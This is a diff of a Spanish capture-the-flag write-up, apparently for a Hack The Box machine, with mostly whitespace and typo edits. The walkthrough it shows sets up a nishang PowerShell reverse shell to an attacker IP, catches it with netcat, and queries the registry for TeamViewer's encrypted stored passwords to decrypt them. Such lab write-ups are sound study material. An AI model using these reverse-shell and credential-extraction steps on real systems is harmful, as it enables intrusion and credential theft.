@@ -487,18 +487,19 @@ Recibiendo objetos: 100% (1705/1705), 10.89 MiB | 10.43 MiB/s, listo.
 Resolviendo deltas: 100% (1064/1064), listo.
 ```
 * Copiamos la siguiente shell que esta en la carpeta "Shells": Invoke-PowerShellTcp.ps1
+
 ```
 cd nishang/shells
 cp Invoke-PowerShellTcp.ps1 path_donde_quieras_que_se_guarde/.
 ```
 * Entramos a la shell y agregamos la siguiente linea al final: Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+
 ```
 {
         Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
         Write-Error $_
     }
 }
-
 Invoke-PowerShellTcp -Reverse -IPAddress TuIP -Port PuertoQueQuieras
 ```
 * Modificamos el exploit para que cargue la Reverse Shell:
@@ -517,13 +518,13 @@ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 * Activamos el exploit y vemos el resultado:
+
 ```
 nc -nvlp 443                                        
 listening on [any] 443 ...
 connect to [10.10.14.9] from (UNKNOWN) [10.10.10.180] 49736
 Windows PowerShell running as user REMOTE$ on REMOTE
 Copyright (C) 2015 Microsoft Corporation. All rights reserved.
-
 PS C:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
 ```
@@ -580,10 +581,10 @@ No creo que nos sirvan estos exploits, mejor vamos a buscar por internet.
 
 Encontre los siguientes links con datos de interes:
 * https://github.com/mr-r3b00t/CVE-2019-18988/blob/master/manual_exploit.bat
-En este link hay varias prubas que podemos hacer dentro de la maquina para obtener las credenciales de Windows
+
+En este link hay varias pruebas que podemos hacer dentro de la maquina para obtener las credenciales de Windows
 ```
 reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7
-
 ```
 Una vez usemos este comando, nos dara información muy util que sera las credenciales pero encriptadas:
 ```
@@ -593,11 +594,11 @@ LastUpdateCheck    REG_DWORD    0x6250227f
     MultiPwdMgmtIDs    REG_MULTI_SZ    admin
     MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
     Security_PasswordStrength    REG_DWORD    0x3
-
 ```
 Lo que necesitamos es desencriptar dichas credenciales aunque la que más nos interesa es la de **SecurityPasswordAES**. Para desencriptarlas, vamos a usar un script en python que creo el usuario del siguiente link.
 
 * https://whynotsecurity.com/blog/teamviewer/
+
 Con leer el blog, vemos la aventura que se echo para descubrir como explotar las vulnerabilidades que se encontraron en el TeamViewer Version 7 y el como le haria para desencriptar dichas credenciales, incluso el siguiente link tambien explica todo esto pero ya resumido: https://kalilinuxtutorials.com/decryptteamviewer/
 
 Pero nosotros vamos a ocupar esta versión: https://gist.github.com/rishdang/442d355180e5c69e0fcb73fecd05d7e0
